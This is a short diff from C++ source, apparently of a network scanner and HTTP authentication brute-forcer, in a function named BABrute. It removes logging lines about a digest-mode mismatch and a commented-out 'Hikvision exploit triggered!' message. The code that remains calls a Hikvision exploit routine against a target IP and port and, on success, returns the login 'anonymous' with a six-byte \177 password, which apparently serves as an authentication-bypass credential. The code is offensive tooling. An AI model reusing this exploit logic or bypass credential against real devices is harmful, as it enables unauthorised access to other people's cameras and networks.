@@ -67,24 +67,17 @@ lopaStr BA::BABrute(const char *ip, const int port, bool digestMode) {
 	else if (isDig == 1) {
 		if (digestMode != true) {
 			digestMode = true;
-			stt->doEmitionRedFoundData("Digest selector mismatch - <a style=\"color:orange;\" href=\"http://" + QString(ip).mid(0, QString(ip).indexOf("/")) + ":" + QString::number(port) + "/\">" +
-				QString(ip) + ":" + QString::number(port) + "</a>");
 		}
 	}
 	else {
 		if (digestMode != false) {
 			digestMode = false;
-			stt->doEmitionRedFoundData("Digest selector mismatch - <a style=\"color:orange;\" href=\"http://" + QString(ip).mid(0, QString(ip).indexOf("/")) + ":" + QString::number(port) + "/\">" +
-				QString(ip) + ":" + QString::number(port) + "</a>");
 		};
 	}
 
 	std::string buffer;
 
 	if (commenceHikvisionEx1(ip, port, digestMode)) {
-		//stt->doEmitionGreenFoundData("Hikvision exploit triggered! (" + 
-		//	QString(ip) + ":" + 
-		//	QString::number(port) + ")");
 		strcpy(lps.login, "anonymous");
 		strcpy(lps.pass, "\177\177\177\177\177\177");
 		return lps;
